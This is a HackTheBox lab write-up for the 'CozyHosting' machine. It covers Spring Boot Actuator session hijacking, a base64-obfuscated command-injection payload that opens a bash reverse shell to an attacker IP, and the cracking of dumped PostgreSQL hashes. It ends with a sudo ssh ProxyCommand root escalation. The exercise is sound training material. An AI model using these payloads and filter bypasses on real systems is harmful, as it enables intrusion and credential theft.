---
title: "CozyHosting"
platform: hackthebox
difficulty: Easy
os: Linux
machine: CozyHosting
date: 2026-01-25
tags: [web, spring-boot, command-injection, postgresql]
excerpt: "Hijacking a Spring Boot Actuator session to access an admin panel, exploiting OS command injection for foothold, and cracking PostgreSQL hashes for root."
---

## Reconnaissance

```bash
nmap -sC -sV -oN nmap/cozyhosting 10.10.11.230
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0
```

The website at `cozyhosting.htb` is a hosting company landing page. Directory fuzzing reveals Spring Boot Actuator endpoints:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://cozyhosting.htb/FUZZ
```

Key findings:
- `/actuator` — Spring Boot Actuator exposed
- `/actuator/sessions` — active session tokens
- `/admin` — admin panel (requires auth)

## Foothold — Session Hijack + Command Injection

### Stealing the Session

The `/actuator/sessions` endpoint leaks active session cookies:

```json
{
  "kanderson": "3F5E2A30C1D94F6B8A0E7C42B5D91F8A"
}
```

Replacing our `JSESSIONID` cookie with Kanderson's token grants access to `/admin`.

### Command Injection

The admin panel has a "Connection Settings" form that sends SSH connection parameters. The `hostname` field is properly validated, but the **username** field is vulnerable to OS command injection:

```bash
# Payload (URL-encoded, no spaces allowed — use ${IFS})
;echo${IFS}YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjUvOTAwMSAwPiYx|base64${IFS}-d|bash;
```

This triggers a reverse shell:

```bash
nc -lvnp 9001
# shell as 'app' user
```

## Lateral Movement — PostgreSQL Credentials

Inside the application directory, we find the Spring Boot JAR. Extracting it reveals `application.properties`:

```properties
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Connecting to PostgreSQL and dumping the users table:

```bash
psql -h 127.0.0.1 -U postgres -d cozyhosting
SELECT * FROM users;
```

```
   name    |                           password
-----------+--------------------------------------------------------------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWl...
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqb...
```

Cracking the admin hash with `hashcat`:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
# Result: manchesterunited
```

The password works for SSH as user `josh`:

```bash
ssh josh@cozyhosting.htb
cat ~/user.txt
```

**User flag captured.**

## Privilege Escalation — sudo ssh

```bash
sudo -l
# (root) /usr/bin/ssh *
```

Classic GTFOBins escalation:

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# root shell
cat /root/root.txt
```

**Root flag captured.** ✅

## Key Takeaways

- Spring Boot Actuator endpoints should **never** be exposed in production
- Command injection can bypass character filters by using `${IFS}` for spaces and base64 encoding
- Always check for credential reuse across services
